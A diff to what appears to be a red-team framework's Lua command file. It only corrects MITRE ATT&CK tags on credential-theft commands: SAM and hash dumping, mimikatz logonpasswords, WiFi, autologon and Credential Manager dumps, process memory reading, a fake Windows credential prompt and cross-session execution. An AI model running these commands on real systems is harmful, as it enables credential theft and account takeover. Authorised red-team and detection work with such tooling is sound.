@@ -143,7 +143,7 @@ local function run_dump_wifi(args, cmd)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
 
-local cmd_dump_wifi = command("wifi:dump", run_dump_wifi, "Dump WiFi profile credentials <profilename>", "T1555.004")
+local cmd_dump_wifi = command("wifi:dump", run_dump_wifi, "Dump WiFi profile credentials <profilename>", "T1552.001")
 cmd_dump_wifi:Flags():String("profilename", "", "WiFi profile name to dump")
 opsec("wifi:dump", 9.0)
 
@@ -208,7 +208,7 @@ local function run_memreader(cmd)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
 
-local cmd_memreader = command("memreader", run_memreader, "Read memory from target process <target-pid> <pattern> [output-size]", "T1055")
+local cmd_memreader = command("memreader", run_memreader, "Read memory from target process <target-pid> <pattern> [output-size]", "T1005")
 cmd_memreader:Flags():String("target-pid", "", "target process ID")
 cmd_memreader:Flags():String("pattern", "", "memory pattern to search")
 cmd_memreader:Flags():String("output-size", "10", "output size limit")
@@ -243,7 +243,7 @@ local function run_dump_sam(args, cmd)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
 
-local cmd_dump_sam = command("dump_sam", run_dump_sam, "Dump the SAM, SECURITY and SYSTEM registries [location]", "T1012")
+local cmd_dump_sam = command("dump_sam", run_dump_sam, "Dump the SAM, SECURITY and SYSTEM registries [location]", "T1003.002")
 cmd_dump_sam:Flags():String("location", "C:\\Windows\\Temp\\", "folder to save (optional)")
 opsec("dump_sam", 9.0)
 
@@ -861,7 +861,7 @@ local function run_logonpasswords()
     return execute_exe(session, script_resource(mimikatz_path), args, true, 600, arch, "", new_sac(),callback_context(session))
 end
 
-local cmd_logonpasswords = command("logonpasswords", run_logonpasswords, "Extract logon passwords using mimikatz", "T1003")
+local cmd_logonpasswords = command("logonpasswords", run_logonpasswords, "Extract logon passwords using mimikatz", "T1003.001")
 opsec("logonpasswords", 5.9)
 
 -- hashdump
@@ -871,7 +871,7 @@ local function run_hashdump()
     local bof_file = bof_path("hashdump", arch)
     return bof(session, script_resource(bof_file), {}, true)
 end
-local cmd_hashdump = command("hashdump", run_hashdump, "Dump the SAM, SECURITY and SYSTEM registries", "T1003")
+local cmd_hashdump = command("hashdump", run_hashdump, "Dump the SAM, SECURITY and SYSTEM registries", "T1003.002")
 opsec("hashdump", 9.0)
 
 -- autologon
@@ -881,7 +881,7 @@ local function run_autologon()
     local bof_file = bof_path("autologon", arch)
     return bof(session, script_resource(bof_file), {}, true)
 end
-local cmd_autologon = command("autologon", run_autologon, "Dump the autologon credentials", "T1003")
+local cmd_autologon = command("autologon", run_autologon, "Dump the autologon credentials", "T1552.001")
 opsec("autologon", 9.0)
 
 -- credman
@@ -891,7 +891,7 @@ local function run_credman()
     local bof_file = bof_path("credman", arch)
     return bof(session, script_resource(bof_file), {}, true)
 end
-local cmd_credman = command("credman", run_credman, "Dump the Credential Manager credentials", "T1003")
+local cmd_credman = command("credman", run_credman, "Dump the Credential Manager credentials", "T1555.004")
 opsec("credman", 9.0)
 
 -- askcreds
@@ -905,7 +905,7 @@ local function run_askcreds(cmd)
     local bof_file = bof_path("askcreds", arch)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
-local cmd_askcreds = command("askcreds", run_askcreds, "Prompt for credentials", "T1003")
+local cmd_askcreds = command("askcreds", run_askcreds, "Prompt for credentials", "T1056.002")
 cmd_askcreds:Flags():String("prompt", "Restore Network Connection", "prompt to display")
 cmd_askcreds:Flags():String("note", "Please verify your Windows user credentials to proceed", "note to display")
 cmd_askcreds:Flags():Int("wait_time", 30, "password to dump credentials for")
@@ -1041,7 +1041,7 @@ local function run_execute_cross_session(cmd)
     local bof_file = bof_path("execute_cross_session", arch)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
-local cmd_execute_cross_session = command("execute_cross_session", run_execute_cross_session, "Execute a binary on disk within the context of another logged-on user's session", "T1003")
+local cmd_execute_cross_session = command("execute_cross_session", run_execute_cross_session, "Execute a binary on disk within the context of another logged-on user's session", "T1134")
 cmd_execute_cross_session:Flags():Int("session_id", 0, "the session ID of the user in which context the specified binary needs to be executed.")
 cmd_execute_cross_session:Flags():String("binary_path", "", "path to the binary that you like to execute")
 
